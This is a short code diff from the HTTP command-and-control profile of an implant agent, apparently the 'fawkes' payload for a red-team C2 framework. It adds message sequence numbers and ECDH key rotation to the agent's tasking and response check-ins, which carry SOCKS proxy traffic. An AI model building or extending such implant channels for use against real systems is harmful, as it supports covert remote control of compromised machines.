@@ -119,10 +119,10 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 
 	taskingMsg := structs.TaskingMessage{
 		Action:      "get_tasking",
-		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
+		TaskingSize: -1,
+		Seq:         h.nextSeq(),
 		Socks:       outboundSocks,
-		// Include agent identification for checkin updates
-		PayloadUUID: h.getActiveUUID(agent, cfg), // Use callback UUID if available
+		PayloadUUID: h.getActiveUUID(agent, cfg),
 		PayloadType: "fawkes",
 		C2Profile:   "http",
 	}
@@ -148,6 +148,18 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		interactiveMsgs := h.GetInteractiveOutbound()
 		if len(interactiveMsgs) > 0 {
 			taskingMsg.Interactive = interactiveMsgs
+		}
+	}
+
+	// ECDH key exchange: Phase 2 confirmation (previous exchange completed)
+	if h.keyRotation != nil && h.keyRotation.Phase() == phaseExchanged {
+		taskingMsg.KeyExchangeConfirm = true
+	}
+
+	// ECDH key exchange: Phase 1 initiation (interval reached, no exchange in progress)
+	if h.keyRotation != nil && h.keyRotation.ShouldInitiateExchange() {
+		if pubKey, err := h.keyRotation.GenerateEphemeralKey(); err == nil {
+			taskingMsg.KeyExchange = pubKey
 		}
 	}
 
@@ -272,6 +284,9 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		}
 	}
 
+	// ECDH key exchange: process server's response
+	h.processKeyExchangeResponse(taskResponse, cfg)
+
 	return tasks, inboundSocks, nil
 }
 
@@ -287,6 +302,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	responseMsg := structs.PostResponseMessage{
 		Action:    "post_response",
+		Seq:       h.nextSeq(),
 		Responses: []structs.Response{response},
 		Socks:     socks,
 	}
